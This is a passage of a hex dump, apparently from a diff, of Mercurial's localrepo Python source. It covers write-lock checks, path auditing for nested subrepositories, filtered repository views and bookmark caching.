-0000cc40: 2069 6620 7265 706f 2e5f 6375 7272 656e   if repo._curren
-0000cc50: 746c 6f63 6b28 7265 706f 2e5f 6c6f 636b  tlock(repo._lock
-0000cc60: 7265 6629 2069 7320 4e6f 6e65 3a0a 2020  ref) is None:.  
-0000cc70: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0000cc80: 2020 7265 706f 2e75 692e 6465 7665 6c77    repo.ui.develw
-0000cc90: 6172 6e28 0a20 2020 2020 2020 2020 2020  arn(.           
-0000cca0: 2020 2020 2020 2020 2020 2020 2062 2777               b'w
-0000ccb0: 7269 7465 2077 6974 6820 6e6f 206c 6f63  rite with no loc
-0000ccc0: 6b3a 2022 2573 2227 2025 2070 6174 682c  k: "%s"' % path,
-0000ccd0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0000cce0: 2020 2020 2020 2020 2073 7461 636b 6c65           stackle
-0000ccf0: 7665 6c3d 332c 0a20 2020 2020 2020 2020  vel=3,.         
-0000cd00: 2020 2020 2020 2020 2020 2020 2020 2063                 c
-0000cd10: 6f6e 6669 673d 6227 6368 6563 6b2d 6c6f  onfig=b'check-lo
-0000cd20: 636b 7327 2c0a 2020 2020 2020 2020 2020  cks',.          
-0000cd30: 2020 2020 2020 2020 2020 290a 2020 2020            ).    
-0000cd40: 2020 2020 2020 2020 656c 6966 2072 6570          elif rep
-0000cd50: 6f2e 5f63 7572 7265 6e74 6c6f 636b 2872  o._currentlock(r
-0000cd60: 6570 6f2e 5f77 6c6f 636b 7265 6629 2069  epo._wlockref) i
-0000cd70: 7320 4e6f 6e65 3a0a 2020 2020 2020 2020  s None:.        
-0000cd80: 2020 2020 2020 2020 2320 7265 7374 206f          # rest o
-0000cd90: 6620 7666 7320 6669 6c65 7320 6172 6520  f vfs files are 
-0000cda0: 636f 7665 7265 6420 6279 2027 776c 6f63  covered by 'wloc
-0000cdb0: 6b27 0a20 2020 2020 2020 2020 2020 2020  k'.             
-0000cdc0: 2020 2023 0a20 2020 2020 2020 2020 2020     #.           
-0000cdd0: 2020 2020 2023 2065 7863 6c75 6465 2073       # exclude s
-0000cde0: 7065 6369 616c 2066 696c 6573 0a20 2020  pecial files.   
-0000cdf0: 2020 2020 2020 2020 2020 2020 2066 6f72               for
-0000ce00: 2070 7265 6669 7820 696e 2073 656c 662e   prefix in self.
-0000ce10: 5f77 6c6f 636b 6672 6565 7072 6566 6978  _wlockfreeprefix
-0000ce20: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-0000ce30: 2020 2020 2020 6966 2070 6174 682e 7374        if path.st
-0000ce40: 6172 7473 7769 7468 2870 7265 6669 7829  artswith(prefix)
-0000ce50: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-0000ce60: 2020 2020 2020 2020 2020 7265 7475 726e            return
-0000ce70: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0000ce80: 2072 6570 6f2e 7569 2e64 6576 656c 7761   repo.ui.develwa
-0000ce90: 726e 280a 2020 2020 2020 2020 2020 2020  rn(.            
-0000cea0: 2020 2020 2020 2020 6227 7772 6974 6520          b'write 
-0000ceb0: 7769 7468 206e 6f20 776c 6f63 6b3a 2022  with no wlock: "
-0000cec0: 2573 2227 2025 2070 6174 682c 0a20 2020  %s"' % path,.   
-0000ced0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0000cee0: 2073 7461 636b 6c65 7665 6c3d 332c 0a20   stacklevel=3,. 
-0000cef0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0000cf00: 2020 2063 6f6e 6669 673d 6227 6368 6563     config=b'chec
-0000cf10: 6b2d 6c6f 636b 7327 2c0a 2020 2020 2020  k-locks',.      
-0000cf20: 2020 2020 2020 2020 2020 290a 2020 2020            ).    
-0000cf30: 2020 2020 2020 2020 7265 7475 726e 2072          return r
-0000cf40: 6574 0a0a 2020 2020 2020 2020 7265 7475  et..        retu
-0000cf50: 726e 2063 6865 636b 7666 730a 0a20 2020  rn checkvfs..   
-0000cf60: 2064 6566 205f 6765 7473 7666 7377 6172   def _getsvfswar
-0000cf70: 6428 7365 6c66 2c20 6f72 6967 6675 6e63  d(self, origfunc
-0000cf80: 293a 0a20 2020 2020 2020 2022 2222 6275  ):.        """bu
-0000cf90: 696c 6420 6120 7761 7264 2066 6f72 2073  ild a ward for s
-0000cfa0: 656c 662e 7376 6673 2222 220a 2020 2020  elf.svfs""".    
-0000cfb0: 2020 2020 7272 6566 203d 2077 6561 6b72      rref = weakr
-0000cfc0: 6566 2e72 6566 2873 656c 6629 0a0a 2020  ef.ref(self)..  
-0000cfd0: 2020 2020 2020 6465 6620 6368 6563 6b73        def checks
-0000cfe0: 7666 7328 7061 7468 2c20 6d6f 6465 3d4e  vfs(path, mode=N
-0000cff0: 6f6e 6529 3a0a 2020 2020 2020 2020 2020  one):.          
-0000d000: 2020 7265 7420 3d20 6f72 6967 6675 6e63    ret = origfunc
-0000d010: 2870 6174 682c 206d 6f64 653d 6d6f 6465  (path, mode=mode
-0000d020: 290a 2020 2020 2020 2020 2020 2020 7265  ).            re
-0000d030: 706f 203d 2072 7265 6628 290a 2020 2020  po = rref().    
-0000d040: 2020 2020 2020 2020 6966 2072 6570 6f20          if repo 
-0000d050: 6973 204e 6f6e 6520 6f72 206e 6f74 2075  is None or not u
-0000d060: 7469 6c2e 7361 6665 6861 7361 7474 7228  til.safehasattr(
-0000d070: 7265 706f 2c20 6227 5f6c 6f63 6b72 6566  repo, b'_lockref
-0000d080: 2729 3a0a 2020 2020 2020 2020 2020 2020  '):.            
-0000d090: 2020 2020 7265 7475 726e 0a20 2020 2020      return.     
-0000d0a0: 2020 2020 2020 2069 6620 6d6f 6465 2069         if mode i
-0000d0b0: 6e20 284e 6f6e 652c 2062 2772 272c 2062  n (None, b'r', b
-0000d0c0: 2772 6227 293a 0a20 2020 2020 2020 2020  'rb'):.         
-0000d0d0: 2020 2020 2020 2072 6574 7572 6e0a 2020         return.  
-0000d0e0: 2020 2020 2020 2020 2020 6966 2070 6174            if pat
-0000d0f0: 682e 7374 6172 7473 7769 7468 2872 6570  h.startswith(rep
-0000d100: 6f2e 7368 6172 6564 7061 7468 293a 0a20  o.sharedpath):. 
-0000d110: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-0000d120: 2074 7275 6e63 6174 6520 6e61 6d65 2072   truncate name r
-0000d130: 656c 6174 6976 6520 746f 2074 6865 2072  elative to the r
-0000d140: 6570 6f73 6974 6f72 7920 282e 6867 290a  epository (.hg).
-0000d150: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0000d160: 7061 7468 203d 2070 6174 685b 6c65 6e28  path = path[len(
-0000d170: 7265 706f 2e73 6861 7265 6470 6174 6829  repo.sharedpath)
-0000d180: 202b 2031 203a 5d0a 2020 2020 2020 2020   + 1 :].        
-0000d190: 2020 2020 6966 2072 6570 6f2e 5f63 7572      if repo._cur
-0000d1a0: 7265 6e74 6c6f 636b 2872 6570 6f2e 5f6c  rentlock(repo._l
-0000d1b0: 6f63 6b72 6566 2920 6973 204e 6f6e 653a  ockref) is None:
-0000d1c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0000d1d0: 2072 6570 6f2e 7569 2e64 6576 656c 7761   repo.ui.develwa
-0000d1e0: 726e 280a 2020 2020 2020 2020 2020 2020  rn(.            
-0000d1f0: 2020 2020 2020 2020 6227 7772 6974 6520          b'write 
-0000d200: 7769 7468 206e 6f20 6c6f 636b 3a20 2225  with no lock: "%
-0000d210: 7322 2720 2520 7061 7468 2c20 7374 6163  s"' % path, stac
-0000d220: 6b6c 6576 656c 3d34 0a20 2020 2020 2020  klevel=4.       
-0000d230: 2020 2020 2020 2020 2029 0a20 2020 2020           ).     
-0000d240: 2020 2020 2020 2072 6574 7572 6e20 7265         return re
-0000d250: 740a 0a20 2020 2020 2020 2072 6574 7572  t..        retur
-0000d260: 6e20 6368 6563 6b73 7666 730a 0a20 2020  n checksvfs..   
-0000d270: 2040 7072 6f70 6572 7479 0a20 2020 2064   @property.    d
-0000d280: 6566 2076 6673 5f6d 6170 2873 656c 6629  ef vfs_map(self)
-0000d290: 3a0a 2020 2020 2020 2020 7265 7475 726e  :.        return
-0000d2a0: 207b 0a20 2020 2020 2020 2020 2020 2062   {.            b
-0000d2b0: 2727 3a20 7365 6c66 2e73 7666 732c 0a20  '': self.svfs,. 
-0000d2c0: 2020 2020 2020 2020 2020 2062 2770 6c61             b'pla
-0000d2d0: 696e 273a 2073 656c 662e 7666 732c 0a20  in': self.vfs,. 
-0000d2e0: 2020 2020 2020 2020 2020 2062 2773 746f             b'sto
-0000d2f0: 7265 273a 2073 656c 662e 7376 6673 2c0a  re': self.svfs,.
-0000d300: 2020 2020 2020 2020 7d0a 0a20 2020 2064          }..    d
-0000d310: 6566 2063 6c6f 7365 2873 656c 6629 3a0a  ef close(self):.
-0000d320: 2020 2020 2020 2020 7365 6c66 2e5f 7772          self._wr
-0000d330: 6974 6563 6163 6865 7328 290a 0a20 2020  itecaches()..   
-0000d340: 2064 6566 205f 7772 6974 6563 6163 6865   def _writecache
-0000d350: 7328 7365 6c66 293a 0a20 2020 2020 2020  s(self):.       
-0000d360: 2069 6620 7365 6c66 2e5f 7265 7662 7261   if self._revbra
-0000d370: 6e63 6863 6163 6865 3a0a 2020 2020 2020  nchcache:.      
-0000d380: 2020 2020 2020 7365 6c66 2e5f 7265 7662        self._revb
-0000d390: 7261 6e63 6863 6163 6865 2e77 7269 7465  ranchcache.write
-0000d3a0: 2829 0a0a 2020 2020 6465 6620 5f72 6573  ()..    def _res
-0000d3b0: 7472 6963 7463 6170 6162 696c 6974 6965  trictcapabilitie
-0000d3c0: 7328 7365 6c66 2c20 6361 7073 293a 0a20  s(self, caps):. 
-0000d3d0: 2020 2020 2020 2069 6620 7365 6c66 2e75         if self.u
-0000d3e0: 692e 636f 6e66 6967 626f 6f6c 2862 2765  i.configbool(b'e
-0000d3f0: 7870 6572 696d 656e 7461 6c27 2c20 6227  xperimental', b'
-0000d400: 6275 6e64 6c65 322d 6164 7665 7274 6973  bundle2-advertis
-0000d410: 6527 293a 0a20 2020 2020 2020 2020 2020  e'):.           
-0000d420: 2063 6170 7320 3d20 7365 7428 6361 7073   caps = set(caps
-0000d430: 290a 2020 2020 2020 2020 2020 2020 6361  ).            ca
-0000d440: 7073 626c 6f62 203d 2062 756e 646c 6532  psblob = bundle2
-0000d450: 2e65 6e63 6f64 6563 6170 7328 0a20 2020  .encodecaps(.   
-0000d460: 2020 2020 2020 2020 2020 2020 2062 756e               bun
-0000d470: 646c 6532 2e67 6574 7265 706f 6361 7073  dle2.getrepocaps
-0000d480: 2873 656c 662c 2072 6f6c 653d 6227 636c  (self, role=b'cl
-0000d490: 6965 6e74 2729 0a20 2020 2020 2020 2020  ient').         
-0000d4a0: 2020 2029 0a20 2020 2020 2020 2020 2020     ).           
-0000d4b0: 2063 6170 732e 6164 6428 6227 6275 6e64   caps.add(b'bund
-0000d4c0: 6c65 323d 2720 2b20 7572 6c72 6571 2e71  le2=' + urlreq.q
-0000d4d0: 756f 7465 2863 6170 7362 6c6f 6229 290a  uote(capsblob)).
-0000d4e0: 2020 2020 2020 2020 6966 2073 656c 662e          if self.
-0000d4f0: 7569 2e63 6f6e 6669 6762 6f6f 6c28 6227  ui.configbool(b'
-0000d500: 6578 7065 7269 6d65 6e74 616c 272c 2062  experimental', b
-0000d510: 276e 6172 726f 7727 293a 0a20 2020 2020  'narrow'):.     
-0000d520: 2020 2020 2020 2063 6170 732e 6164 6428         caps.add(
-0000d530: 7769 7265 7072 6f74 6f74 7970 6573 2e4e  wireprototypes.N
-0000d540: 4152 524f 5743 4150 290a 2020 2020 2020  ARROWCAP).      
-0000d550: 2020 7265 7475 726e 2063 6170 730a 0a20    return caps.. 
-0000d560: 2020 2023 2044 6f6e 2774 2063 6163 6865     # Don't cache
-0000d570: 2061 7564 6974 6f72 2f6e 6f66 7361 7564   auditor/nofsaud
-0000d580: 6974 6f72 2c20 6f72 2079 6f75 276c 6c20  itor, or you'll 
-0000d590: 656e 6420 7570 2077 6974 6820 7265 6665  end up with refe
-0000d5a0: 7265 6e63 6520 6379 636c 653a 0a20 2020  rence cycle:.   
-0000d5b0: 2023 2073 656c 6620 2d3e 2061 7564 6974   # self -> audit
-0000d5c0: 6f72 202d 3e20 7365 6c66 2e5f 6368 6563  or -> self._chec
-0000d5d0: 6b6e 6573 7465 6420 2d3e 2073 656c 660a  knested -> self.
-0000d5e0: 0a20 2020 2040 7072 6f70 6572 7479 0a20  .    @property. 
-0000d5f0: 2020 2064 6566 2061 7564 6974 6f72 2873     def auditor(s
-0000d600: 656c 6629 3a0a 2020 2020 2020 2020 2320  elf):.        # 
-0000d610: 5468 6973 2069 7320 6f6e 6c79 2075 7365  This is only use
-0000d620: 6420 6279 2063 6f6e 7465 7874 2e77 6f72  d by context.wor
-0000d630: 6b69 6e67 6374 782e 6d61 7463 6820 696e  kingctx.match in
-0000d640: 206f 7264 6572 2074 6f0a 2020 2020 2020   order to.      
-0000d650: 2020 2320 6465 7465 6374 2066 696c 6573    # detect files
-0000d660: 2069 6e20 7375 6272 6570 6f73 2e0a 2020   in subrepos..  
-0000d670: 2020 2020 2020 7265 7475 726e 2070 6174        return pat
-0000d680: 6875 7469 6c2e 7061 7468 6175 6469 746f  hutil.pathaudito
-0000d690: 7228 7365 6c66 2e72 6f6f 742c 2063 616c  r(self.root, cal
-0000d6a0: 6c62 6163 6b3d 7365 6c66 2e5f 6368 6563  lback=self._chec
-0000d6b0: 6b6e 6573 7465 6429 0a0a 2020 2020 4070  knested)..    @p
-0000d6c0: 726f 7065 7274 790a 2020 2020 6465 6620  roperty.    def 
-0000d6d0: 6e6f 6673 6175 6469 746f 7228 7365 6c66  nofsauditor(self
-0000d6e0: 293a 0a20 2020 2020 2020 2023 2054 6869  ):.        # Thi
-0000d6f0: 7320 6973 206f 6e6c 7920 7573 6564 2062  s is only used b
-0000d700: 7920 636f 6e74 6578 742e 6261 7365 6374  y context.basect
-0000d710: 782e 6d61 7463 6820 696e 206f 7264 6572  x.match in order
-0000d720: 2074 6f20 6465 7465 6374 0a20 2020 2020   to detect.     
-0000d730: 2020 2023 2066 696c 6573 2069 6e20 7375     # files in su
-0000d740: 6272 6570 6f73 2e0a 2020 2020 2020 2020  brepos..        
-0000d750: 7265 7475 726e 2070 6174 6875 7469 6c2e  return pathutil.
-0000d760: 7061 7468 6175 6469 746f 7228 0a20 2020  pathauditor(.   
-0000d770: 2020 2020 2020 2020 2073 656c 662e 726f           self.ro
-0000d780: 6f74 2c20 6361 6c6c 6261 636b 3d73 656c  ot, callback=sel
-0000d790: 662e 5f63 6865 636b 6e65 7374 6564 2c20  f._checknested, 
-0000d7a0: 7265 616c 6673 3d46 616c 7365 2c20 6361  realfs=False, ca
-0000d7b0: 6368 6564 3d54 7275 650a 2020 2020 2020  ched=True.      
-0000d7c0: 2020 290a 0a20 2020 2064 6566 205f 6368    )..    def _ch
-0000d7d0: 6563 6b6e 6573 7465 6428 7365 6c66 2c20  ecknested(self, 
-0000d7e0: 7061 7468 293a 0a20 2020 2020 2020 2022  path):.        "
-0000d7f0: 2222 4465 7465 726d 696e 6520 6966 2070  ""Determine if p
-0000d800: 6174 6820 6973 2061 206c 6567 616c 206e  ath is a legal n
-0000d810: 6573 7465 6420 7265 706f 7369 746f 7279  ested repository
-0000d820: 2e22 2222 0a20 2020 2020 2020 2069 6620  .""".        if 
-0000d830: 6e6f 7420 7061 7468 2e73 7461 7274 7377  not path.startsw
-0000d840: 6974 6828 7365 6c66 2e72 6f6f 7429 3a0a  ith(self.root):.
-0000d850: 2020 2020 2020 2020 2020 2020 7265 7475              retu
-0000d860: 726e 2046 616c 7365 0a20 2020 2020 2020  rn False.       
-0000d870: 2073 7562 7061 7468 203d 2070 6174 685b   subpath = path[
-0000d880: 6c65 6e28 7365 6c66 2e72 6f6f 7429 202b  len(self.root) +
-0000d890: 2031 203a 5d0a 2020 2020 2020 2020 6e6f   1 :].        no
-0000d8a0: 726d 7375 6270 6174 6820 3d20 7574 696c  rmsubpath = util
-0000d8b0: 2e70 636f 6e76 6572 7428 7375 6270 6174  .pconvert(subpat
-0000d8c0: 6829 0a0a 2020 2020 2020 2020 2320 5858  h)..        # XX
-0000d8d0: 583a 2043 6865 636b 696e 6720 6167 6169  X: Checking agai
-0000d8e0: 6e73 7420 7468 6520 6375 7272 656e 7420  nst the current 
-0000d8f0: 776f 726b 696e 6720 636f 7079 2069 7320  working copy is 
-0000d900: 7772 6f6e 6720 696e 0a20 2020 2020 2020  wrong in.       
-0000d910: 2023 2074 6865 2073 656e 7365 2074 6861   # the sense tha
-0000d920: 7420 6974 2063 616e 2072 656a 6563 7420  t it can reject 
-0000d930: 7468 696e 6773 206c 696b 650a 2020 2020  things like.    
-0000d940: 2020 2020 230a 2020 2020 2020 2020 2320      #.        # 
-0000d950: 2020 2420 6867 2063 6174 202d 7220 3130    $ hg cat -r 10
-0000d960: 2073 7562 2f78 2e74 7874 0a20 2020 2020   sub/x.txt.     
-0000d970: 2020 2023 0a20 2020 2020 2020 2023 2069     #.        # i
-0000d980: 6620 7375 622f 2069 7320 6e6f 206c 6f6e  f sub/ is no lon
-0000d990: 6765 7220 6120 7375 6272 6570 6f73 6974  ger a subreposit
-0000d9a0: 6f72 7920 696e 2074 6865 2077 6f72 6b69  ory in the worki
-0000d9b0: 6e67 2063 6f70 790a 2020 2020 2020 2020  ng copy.        
-0000d9c0: 2320 7061 7265 6e74 2072 6576 6973 696f  # parent revisio
-0000d9d0: 6e2e 0a20 2020 2020 2020 2023 0a20 2020  n..        #.   
-0000d9e0: 2020 2020 2023 2048 6f77 6576 6572 2c20       # However, 
-0000d9f0: 6974 2063 616e 206f 6620 636f 7572 7365  it can of course
-0000da00: 2061 6c73 6f20 616c 6c6f 7720 7468 696e   also allow thin
-0000da10: 6773 2074 6861 7420 776f 756c 6420 6861  gs that would ha
-0000da20: 7665 0a20 2020 2020 2020 2023 2062 6565  ve.        # bee
-0000da30: 6e20 7265 6a65 6374 6564 2062 6566 6f72  n rejected befor
-0000da40: 652c 2073 7563 6820 6173 2074 6865 2061  e, such as the a
-0000da50: 626f 7665 2063 6174 2063 6f6d 6d61 6e64  bove cat command
-0000da60: 2069 6620 7375 622f 0a20 2020 2020 2020   if sub/.       
-0000da70: 2023 2069 7320 6120 7375 6272 6570 6f73   # is a subrepos
-0000da80: 6974 6f72 7920 6e6f 772c 2062 7574 2077  itory now, but w
-0000da90: 6173 2061 206e 6f72 6d61 6c20 6469 7265  as a normal dire
-0000daa0: 6374 6f72 7920 6265 666f 7265 2e0a 2020  ctory before..  
-0000dab0: 2020 2020 2020 2320 5468 6520 6f6c 6420        # The old 
-0000dac0: 7061 7468 2061 7564 6974 6f72 2077 6f75  path auditor wou
-0000dad0: 6c64 2068 6176 6520 7265 6a65 6374 6564  ld have rejected
-0000dae0: 2062 7920 6d69 7374 616b 6520 7369 6e63   by mistake sinc
-0000daf0: 6520 6974 0a20 2020 2020 2020 2023 2070  e it.        # p
-0000db00: 616e 6963 7320 7768 656e 2069 7420 7365  anics when it se
-0000db10: 6573 2073 7562 2f2e 6867 2f2e 0a20 2020  es sub/.hg/..   
-0000db20: 2020 2020 2023 0a20 2020 2020 2020 2023       #.        #
-0000db30: 2041 6c6c 2069 6e20 616c 6c2c 2063 6865   All in all, che
-0000db40: 636b 696e 6720 6167 6169 6e73 7420 7468  cking against th
-0000db50: 6520 776f 726b 696e 6720 636f 7079 2073  e working copy s
-0000db60: 6565 6d73 2073 656e 7369 626c 650a 2020  eems sensible.  
-0000db70: 2020 2020 2020 2320 7369 6e63 6520 7765        # since we
-0000db80: 2077 616e 7420 746f 2070 7265 7665 6e74   want to prevent
-0000db90: 2061 6363 6573 7320 746f 206e 6573 7465   access to neste
-0000dba0: 6420 7265 706f 7369 746f 7269 6573 206f  d repositories o
-0000dbb0: 6e0a 2020 2020 2020 2020 2320 7468 6520  n.        # the 
-0000dbc0: 6669 6c65 7379 7374 656d 202a 6e6f 772a  filesystem *now*
-0000dbd0: 2e0a 2020 2020 2020 2020 6374 7820 3d20  ..        ctx = 
-0000dbe0: 7365 6c66 5b4e 6f6e 655d 0a20 2020 2020  self[None].     
-0000dbf0: 2020 2070 6172 7473 203d 2075 7469 6c2e     parts = util.
-0000dc00: 7370 6c69 7470 6174 6828 7375 6270 6174  splitpath(subpat
-0000dc10: 6829 0a20 2020 2020 2020 2077 6869 6c65  h).        while
-0000dc20: 2070 6172 7473 3a0a 2020 2020 2020 2020   parts:.        
-0000dc30: 2020 2020 7072 6566 6978 203d 2062 272f      prefix = b'/
-0000dc40: 272e 6a6f 696e 2870 6172 7473 290a 2020  '.join(parts).  
-0000dc50: 2020 2020 2020 2020 2020 6966 2070 7265            if pre
-0000dc60: 6669 7820 696e 2063 7478 2e73 7562 7374  fix in ctx.subst
-0000dc70: 6174 653a 0a20 2020 2020 2020 2020 2020  ate:.           
-0000dc80: 2020 2020 2069 6620 7072 6566 6978 203d       if prefix =
-0000dc90: 3d20 6e6f 726d 7375 6270 6174 683a 0a20  = normsubpath:. 
-0000dca0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0000dcb0: 2020 2072 6574 7572 6e20 5472 7565 0a20     return True. 
-0000dcc0: 2020 2020 2020 2020 2020 2020 2020 2065                 e
-0000dcd0: 6c73 653a 0a20 2020 2020 2020 2020 2020  lse:.           
-0000dce0: 2020 2020 2020 2020 2073 7562 203d 2063           sub = c
-0000dcf0: 7478 2e73 7562 2870 7265 6669 7829 0a20  tx.sub(prefix). 
-0000dd00: 2020 2020 2020 2020 2020 2020 2020 2020                  
-0000dd10: 2020 2072 6574 7572 6e20 7375 622e 6368     return sub.ch
-0000dd20: 6563 6b6e 6573 7465 6428 7375 6270 6174  ecknested(subpat
-0000dd30: 685b 6c65 6e28 7072 6566 6978 2920 2b20  h[len(prefix) + 
-0000dd40: 3120 3a5d 290a 2020 2020 2020 2020 2020  1 :]).          
-0000dd50: 2020 656c 7365 3a0a 2020 2020 2020 2020    else:.        
-0000dd60: 2020 2020 2020 2020 7061 7274 732e 706f          parts.po
-0000dd70: 7028 290a 2020 2020 2020 2020 7265 7475  p().        retu
-0000dd80: 726e 2046 616c 7365 0a0a 2020 2020 6465  rn False..    de
-0000dd90: 6620 7065 6572 2873 656c 662c 2070 6174  f peer(self, pat
-0000dda0: 683d 4e6f 6e65 293a 0a20 2020 2020 2020  h=None):.       
-0000ddb0: 2072 6574 7572 6e20 6c6f 6361 6c70 6565   return localpee
-0000ddc0: 7228 7365 6c66 2c20 7061 7468 3d70 6174  r(self, path=pat
-0000ddd0: 6829 2020 2320 6e6f 7420 6361 6368 6564  h)  # not cached
-0000dde0: 2074 6f20 6176 6f69 6420 7265 6665 7265   to avoid refere
-0000ddf0: 6e63 6520 6379 636c 650a 0a20 2020 2064  nce cycle..    d
-0000de00: 6566 2075 6e66 696c 7465 7265 6428 7365  ef unfiltered(se
-0000de10: 6c66 293a 0a20 2020 2020 2020 2022 2222  lf):.        """
-0000de20: 5265 7475 726e 2075 6e66 696c 7465 7265  Return unfiltere
-0000de30: 6420 7665 7273 696f 6e20 6f66 2074 6865  d version of the
-0000de40: 2072 6570 6f73 6974 6f72 790a 0a20 2020   repository..   
-0000de50: 2020 2020 2049 6e74 656e 6465 6420 746f       Intended to
-0000de60: 2062 6520 6f76 6572 7772 6974 7465 6e20   be overwritten 
-0000de70: 6279 2066 696c 7465 7265 6420 7265 706f  by filtered repo
-0000de80: 2e22 2222 0a20 2020 2020 2020 2072 6574  .""".        ret
-0000de90: 7572 6e20 7365 6c66 0a0a 2020 2020 6465  urn self..    de
-0000dea0: 6620 6669 6c74 6572 6564 2873 656c 662c  f filtered(self,
-0000deb0: 206e 616d 652c 2076 6973 6962 696c 6974   name, visibilit
-0000dec0: 7965 7863 6570 7469 6f6e 733d 4e6f 6e65  yexceptions=None
-0000ded0: 293a 0a20 2020 2020 2020 2022 2222 5265  ):.        """Re
-0000dee0: 7475 726e 2061 2066 696c 7465 7265 6420  turn a filtered 
-0000def0: 7665 7273 696f 6e20 6f66 2061 2072 6570  version of a rep
-0000df00: 6f73 6974 6f72 790a 0a20 2020 2020 2020  ository..       
-0000df10: 2054 6865 2060 6e61 6d65 6020 7061 7261   The `name` para
-0000df20: 6d65 7465 7220 6973 2074 6865 2069 6465  meter is the ide
-0000df30: 6e74 6966 6965 7220 6f66 2074 6865 2072  ntifier of the r
-0000df40: 6571 7565 7374 6564 2076 6965 772e 2054  equested view. T
-0000df50: 6869 730a 2020 2020 2020 2020 7769 6c6c  his.        will
-0000df60: 2072 6574 7572 6e20 6120 7265 706f 7669   return a repovi
-0000df70: 6577 206f 626a 6563 7420 7365 7420 2265  ew object set "e
-0000df80: 7861 6374 6c79 2220 746f 2074 6865 2073  xactly" to the s
-0000df90: 7065 6369 6669 6564 2076 6965 772e 0a0a  pecified view...
-0000dfa0: 2020 2020 2020 2020 5468 6973 2066 756e          This fun
-0000dfb0: 6374 696f 6e20 646f 6573 206e 6f74 2061  ction does not a
-0000dfc0: 7070 6c79 2072 6563 7572 7369 7665 2066  pply recursive f
-0000dfd0: 696c 7465 7269 6e67 2074 6f20 6120 7265  iltering to a re
-0000dfe0: 706f 7369 746f 7279 2e20 466f 720a 2020  pository. For.  
-0000dff0: 2020 2020 2020 6578 616d 706c 6520 6361        example ca
-0000e000: 6c6c 696e 6720 6072 6570 6f2e 6669 6c74  lling `repo.filt
-0000e010: 6572 6564 2822 7365 7276 6564 2229 6020  ered("served")` 
-0000e020: 7769 6c6c 2072 6574 7572 6e20 6120 7265  will return a re
-0000e030: 706f 7669 6577 2075 7369 6e67 0a20 2020  poview using.   
-0000e040: 2020 2020 2074 6865 2022 7365 7276 6564       the "served
-0000e050: 2220 7669 6577 2c20 7265 6761 7264 6c65  " view, regardle
-0000e060: 7373 206f 6620 7468 6520 696e 6974 6961  ss of the initia
-0000e070: 6c20 7669 6577 2075 7365 6420 6279 2060  l view used by `
-0000e080: 7265 706f 602e 0a0a 2020 2020 2020 2020  repo`...        
-0000e090: 496e 206f 7468 6572 2077 6f72 642c 2074  In other word, t
-0000e0a0: 6865 7265 2069 7320 616c 7761 7973 206f  here is always o
-0000e0b0: 6e6c 7920 6f6e 6520 6c65 7665 6c20 6f66  nly one level of
-0000e0c0: 2060 7265 706f 7669 6577 6020 2266 696c   `repoview` "fil
-0000e0d0: 7465 7269 6e67 222e 0a20 2020 2020 2020  tering"..       
-0000e0e0: 2022 2222 0a20 2020 2020 2020 2069 6620   """.        if 
-0000e0f0: 7365 6c66 2e5f 6578 7472 6166 696c 7465  self._extrafilte
-0000e100: 7269 6420 6973 206e 6f74 204e 6f6e 6520  rid is not None 
-0000e110: 616e 6420 6227 2527 206e 6f74 2069 6e20  and b'%' not in 
-0000e120: 6e61 6d65 3a0a 2020 2020 2020 2020 2020  name:.          
-0000e130: 2020 6e61 6d65 203d 206e 616d 6520 2b20    name = name + 
-0000e140: 6227 2527 202b 2073 656c 662e 5f65 7874  b'%' + self._ext
-0000e150: 7261 6669 6c74 6572 6964 0a0a 2020 2020  rafilterid..    
-0000e160: 2020 2020 636c 7320 3d20 7265 706f 7669      cls = repovi
-0000e170: 6577 2e6e 6577 7479 7065 2873 656c 662e  ew.newtype(self.
-0000e180: 756e 6669 6c74 6572 6564 2829 2e5f 5f63  unfiltered().__c
-0000e190: 6c61 7373 5f5f 290a 2020 2020 2020 2020  lass__).        
-0000e1a0: 7265 7475 726e 2063 6c73 2873 656c 662c  return cls(self,
-0000e1b0: 206e 616d 652c 2076 6973 6962 696c 6974   name, visibilit
-0000e1c0: 7965 7863 6570 7469 6f6e 7329 0a0a 2020  yexceptions)..  
-0000e1d0: 2020 406d 6978 6564 7265 706f 7374 6f72    @mixedrepostor
-0000e1e0: 6563 6163 6865 280a 2020 2020 2020 2020  ecache(.        
-0000e1f0: 2862 2762 6f6f 6b6d 6172 6b73 272c 2062  (b'bookmarks', b
-0000e200: 2770 6c61 696e 2729 2c0a 2020 2020 2020  'plain'),.      
-0000e210: 2020 2862 2762 6f6f 6b6d 6172 6b73 2e63    (b'bookmarks.c
-0000e220: 7572 7265 6e74 272c 2062 2770 6c61 696e  urrent', b'plain
-0000e230: 2729 2c0a 2020 2020 2020 2020 2862 2762  '),.        (b'b
-0000e240: 6f6f 6b6d 6172 6b73 272c 2062 2727 292c  ookmarks', b''),
-0000e250: 0a20 2020 2020 2020 2028 6227 3030 6368  .        (b'00ch
-0000e260: 616e 6765 6c6f 672e 6927 2c20 6227 2729  angelog.i', b'')
-0000e270: 2c0a 2020 2020 290a 2020 2020 6465 6620  ,.    ).    def 
-0000e280: 5f62 6f6f 6b6d 6172 6b73 2873 656c 6629  _bookmarks(self)
-0000e290: 3a0a 2020 2020 2020 2020 2320 5369 6e63  :.        # Sinc
-0000e2a0: 6520 7468 6520 6d75 6c74 6970 6c65 2066  e the multiple f
-0000e2b0: 696c 6573 2069 6e76 6f6c 7665 6420 696e  iles involved in
-0000e2c0: 2074 6865 2074 7261 6e73 6163 7469 6f6e   the transaction
-0000e2d0: 2063 616e 6e6f 7420 6265 0a20 2020 2020   cannot be.     
-0000e2e0: 2020 2023 2077 7269 7474 656e 2061 746f     # written ato
-0000e2f0: 6d69 6361 6c6c 7920 2877 6974 6820 6375  mically (with cu
-0000e300: 7272 656e 7420 7265 706f 7369 746f 7279  rrent repository
-0000e310: 2066 6f72 6d61 7429 2c20 7468 6572 6520   format), there 
-0000e320: 6973 2061 2072 6163 650a 2020 2020 2020  is a race.      
